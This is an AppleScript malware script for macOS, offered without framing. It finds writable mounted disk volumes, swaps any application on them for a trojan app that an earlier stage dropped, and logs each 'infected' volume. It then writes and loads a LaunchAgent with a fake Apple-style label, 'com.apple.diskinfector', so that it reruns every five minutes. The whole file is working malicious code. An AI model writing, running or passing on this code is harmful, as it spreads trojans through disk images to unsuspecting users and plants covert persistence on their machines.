-- Define trojan app path (already dropped by earlier stage)
set trojanAppPath to (POSIX path of (path to library folder from user domain)) & "malware/TrojanApp.app"

-- Function to infect mounted DMG volumes
on infectDMGs()
	set diskList to list disks
	repeat with d in diskList
		set volPath to "/Volumes/" & d
		try
			-- Check if it's writable
			if (do shell script "test -w " & quoted form of volPath & " && echo OK") is "OK" then
				-- If it has a .app inside, back it up and replace
				set foundApp to (do shell script "find " & quoted form of volPath & " -maxdepth 1 -name '*.app' -print -quit")
				if foundApp is not "" then
					set origBackup to foundApp & ".bak"
					do shell script "mv " & quoted form of foundApp & " " & quoted form of origBackup
					do shell script "cp -R " & quoted form of trojanAppPath & " " & quoted form of foundApp
					log "Infected volume: " & volPath
				end if
			end if
		end try
	end repeat
end infectDMGs

-- Drop LaunchAgent for persistence
on installPersistence()
	set plistContent to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.apple.diskinfector</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/osascript</string>
        <string>" & (POSIX path of (path to me)) & "</string>
    </array>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"

	set plistPath to (POSIX path of (path to library folder from user domain)) & "LaunchAgents/com.apple.diskinfector.plist"
	do shell script "echo " & quoted form of plistContent & " > " & quoted form of plistPath
	do shell script "launchctl load -w " & quoted form of plistPath
end installPersistence

-- Main execution
infectDMGs()
installPersistence()
